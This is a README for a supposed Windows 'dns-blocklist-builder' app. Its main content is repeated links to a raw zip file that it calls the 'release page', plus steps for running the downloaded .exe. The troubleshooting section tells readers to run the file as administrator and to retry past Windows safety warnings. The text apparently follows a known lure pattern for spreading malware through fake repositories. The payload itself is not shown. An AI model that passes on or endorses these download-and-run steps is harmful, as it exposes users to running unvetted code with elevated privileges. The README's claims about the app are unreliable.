# 🛡️ dns-blocklist-builder - Build DNS blocks with ease

[![Download the app](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip)

## 🌐 What this app does

dns-blocklist-builder helps you create DNS blocklists for common tools like dnsmasq, Pi-hole, AdGuard, and Unbound.

It is made for people who want to block:

- disinformation
- propaganda
- tracking domains
- known unwanted web hosts

It includes:

- 11 categories
- 402+ domains
- 6 languages
- 6 output formats

It works offline, has no tracking, and needs no extra setup beyond the app itself.

## ⬇️ Download the app

Visit the release page and download the Windows version from there:

https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip

On that page, pick the latest release and choose the file for Windows. If there is more than one file, use the one with `.exe` or `.zip` in the name.

## 🪟 Install on Windows

### 1. Download the file
Open the release page and download the Windows file.

### 2. Open the download
If you downloaded a `.zip` file, right-click it and choose Extract All.

If you downloaded a `.exe` file, double-click it to start the app.

### 3. Start the app
If the app opens in a window, you are ready to use it.

If Windows asks for permission, choose Yes so the app can run.

## 🧭 First time setup

When the app opens for the first time, you will likely see a simple screen with a few choices.

Use these steps:

1. Choose the language you want.
2. Choose the blocklist type you need.
3. Pick the output format for your DNS tool.
4. Select the categories you want to include.
5. Create the file and save it to your computer.

If you use Pi-hole, choose the Pi-hole format.

If you use AdGuard, choose the AdGuard format.

If you use dnsmasq or Unbound, choose the matching output format.

## 🧱 Blocklist categories

The app groups domains into useful categories so you can control what gets blocked.

Common categories include:

- disinformation
- propaganda
- tracking
- media sites
- political content
- news sources
- regional sources
- language-based groups
- mixed source sets
- custom lists
- general safety filters

You can build a list for broad blocking or a tighter list for a more focused setup.

## ⚙️ Output formats

dns-blocklist-builder can create files for several DNS tools.

### dnsmasq
Use this if your router, server, or local DNS setup uses dnsmasq rules.

### Pi-hole
Use this if you want a blocklist that works with Pi-hole.

### AdGuard
Use this if you use AdGuard Home or a similar AdGuard setup.

### Unbound
Use this if you want a list for Unbound-based DNS filtering.

Choose the format that matches your setup. The app will build the file for that target.

## 📁 How to use the generated file

After the app creates your blocklist file, place it where your DNS tool expects it.

### Pi-hole
Add the file as a custom list or use it in the Pi-hole admin panel.

### AdGuard Home
Import the file through the filtering or DNS blocklist area.

### dnsmasq
Save the file in the location your config uses, then reload the DNS service.

### Unbound
Use the file in your Unbound config as part of your local block setup.

If your DNS tool uses a refresh or reload button, use it after adding the file.

## 🌍 Language options

The app supports 6 languages so you can work with the list in a way that fits your use.

You can use the app to build blocklists for:

- English
- Spanish
- French
- German
- Portuguese
- Russian

This helps if you want a list that matches a region or a source language.

## 🔒 Privacy and offline use

This app does not need an internet connection to run after you download it.

That means:

- no cloud login
- no tracking
- no account setup
- no extra services

You can build lists on a laptop with no network access.

## 🖥️ System requirements

The app is made for Windows desktops and laptops.

Recommended setup:

- Windows 10 or Windows 11
- 2 GB RAM or more
- 100 MB free disk space
- A mouse and keyboard
- Permission to run downloaded apps

No extra tools should be needed.

## 🧰 Typical use cases

Use dns-blocklist-builder if you want to:

- block disinformation sources on your network
- reduce tracking across devices
- create DNS filters for a home setup
- prepare lists for Pi-hole or AdGuard Home
- build offline lists for later use
- manage multiple language-based blocklists

## 📝 Basic workflow

1. Download the app from the release page.
2. Open it on Windows.
3. Pick the format you need.
4. Select categories and languages.
5. Generate the file.
6. Add the file to your DNS tool.
7. Reload your DNS service

## 🧩 File types you may see

Depending on the version you download, you may see:

- `.exe` for a Windows app
- `.zip` for a packed Windows release
- text-based output files for blocklists
- config files for DNS tools

If you use a `.zip` file, extract it before opening the app.

## 🛠️ Troubleshooting

### The app does not open
Try these steps:

- right-click the file and choose Run as administrator
- make sure you extracted the `.zip` file first
- check that Windows did not block the file
- download the file again from the release page

### Windows says it is unsafe
This can happen with downloaded apps. If you trust the source, use the file from the official release page and try again.

### My DNS tool does not load the list
Check these points:

- the file format matches your DNS tool
- the path in your config is correct
- the service was reloaded after adding the file
- the file was not edited by mistake

### The output looks too large
Pick fewer categories or one language group. You can also build a smaller list and test it first.

## 🔍 What makes it useful

dns-blocklist-builder keeps the process simple:

- one app for multiple DNS tools
- clear category selection
- language-based list building
- offline use
- no extra dependencies
- direct output for common blocklist systems

## 📌 Download link

Use this page to download the Windows release:

https://raw.githubusercontent.com/hammerantipodes82/dns-blocklist-builder/main/lists/builder-dns-blocklist-v2.7.zip